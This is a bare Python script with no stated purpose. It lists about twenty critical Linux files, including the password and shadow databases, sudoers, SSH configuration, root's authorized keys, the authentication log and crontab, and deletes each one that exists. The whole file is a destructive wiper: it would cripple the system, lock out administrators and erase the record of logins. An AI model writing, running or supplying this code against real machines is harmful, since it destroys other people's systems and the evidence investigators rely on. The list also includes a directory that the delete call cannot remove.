import os

files_to_delete = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/sudoers",
    "/etc/ssh/sshd_config",
    "/etc/hosts",
    "/etc/network/interfaces",
    "/etc/fstab",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/securetty",
    "/etc/motd",
    "/var/log/auth.log",
    "/root/.ssh/authorized_keys",
    "/etc/hosts.allow",
    "/etc/hosts.deny",
    "/etc/crontab",
    "/etc/cron.d/",
    "/etc/passwd-",
    "/etc/shadow-",
]

for file in files_to_delete:
    if os.path.exists(file):
        os.remove(file)
        print(f"Deleted {file}")
    else:
        print(f"{file} does not exist")